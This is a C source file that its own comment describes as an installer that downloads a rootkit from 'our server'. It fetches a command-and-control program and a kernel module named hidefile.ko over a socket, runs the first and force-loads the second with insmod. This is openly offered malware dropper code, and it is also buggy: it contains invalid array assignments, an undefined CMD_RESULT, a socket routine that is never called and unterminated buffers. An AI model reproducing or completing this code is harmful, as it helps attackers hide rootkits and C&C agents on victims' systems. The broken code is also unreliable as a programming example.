#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/shm.h>
#include <errno.h>


#define BUFFER_SIZE 4096
#define SP_PORT     8890
#define SERVER_ADDR "127.0.0.1"
static char* ROOTKIT = "hidefile.ko";   
static char* CCPROGRAM = "ccprogram";  
char buf[BUFFER_SIZE];
int sock_fd;

int readbuf(int conn, char* buf, int size);
int getIntFromBuf(char* buf, int offset);

int execcmd(char** args);
int obtain(char* filename);
int opensocket();

/**
 * @brief This installer.c is a installer that download the rootkit from our server
 * @return 
 */
int main()
{
    int rv;
    char **argv;
    
    rv = obtain(CCPROGRAM);
    memcpy(buf, "./", 2);
    memcpy(buf, CCPROGRAM, strlen(CCPROGRAM));
    argv = {buf, NULL};
    if(rv == 0) execcmd(argv);
    
    rv = obtain(ROOTKIT);
    argv = {"/sbin/insmod", "-f", ROOTKIT, NULL};
    if(rv == 0) execcmd(argv);
    
    printf("Install success!\n");
    return 0;
}

int opensocket(){
    sock_fd = socket(AF_INET,SOCK_STREAM, 0);
    struct sockaddr_in servaddr;
    
    memset(&servaddr, 0, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
    servaddr.sin_port = htons(SP_PORT); 
    servaddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);  
    
    if (connect(sock_fd, (struct sockaddr *)&servaddr, sizeof(servaddr)) < 0)
    {
        printf("Connect failure!\n");
        exit(1);
    } 
}

int obtain(char* filename){
    FILE *fp;
    int filesize, chunk;
                    
    memcpy(buf, "obtain\n", 7);                     // Req for obtain a rootkit/C&C program
    send(sock_fd, buf, strlen(buf),0); 
    
    memcpy(buf, filename, strlen(filename));
    memcpy(buf + strlen(filename), "\n", 1);
    send(sock_fd, buf, strlen(buf),0); 
    
    memset(buf, 0, sizeof(buf));    
    readbuf(sock_fd, buf, 4);                      // Read file size
    filesize = getIntFromBuf(buf, 0);
    if(filesize == 0)  return -1;
    
    memset(buf, 0, sizeof(buf));
    fp=fopen(filename,"w+");                         // Obtain file with buffer
    while(filesize > 0){
        if(filesize > BUFFER_SIZE){
            readbuf(sock_fd, buf, BUFFER_SIZE);
            fwrite(buf, BUFFER_SIZE, 1, fp);
            filesize -= BUFFER_SIZE;
        } else {
            readbuf(sock_fd, buf, filesize);
            fwrite(buf, filesize, 1, fp);
            break;
        }
    }
    
    fclose(fp);
    close(sock_fd);
    return 0;
}

int readbuf(int conn, char* buf, int size){
    int cur = 0;
    while(cur < size){
        int cnt = recv(conn, buf + cur, size - cur, 0);
        if(cnt > 0){
            cur += cnt;
        } 
    }
    return cur;
}

int getIntFromBuf(char* buf, int offset){
    int value;    
    value = (int) ( ((buf[offset] & 0xFF)<<24)  
            |((buf[offset+1] & 0xFF)<<16)  
            |((buf[offset+2] & 0xFF)<<8)  
            |(buf[offset+3] & 0xFF));  
    return value;
}

int execcmd(char** args){
    int i, j;
    
    if((i=fork()) == 0){
        freopen(CMD_RESULT, "w", stdout);
        execvp(args[0], args); 
    }
    waitpid(i, &j, 0);
    
    return 0;
}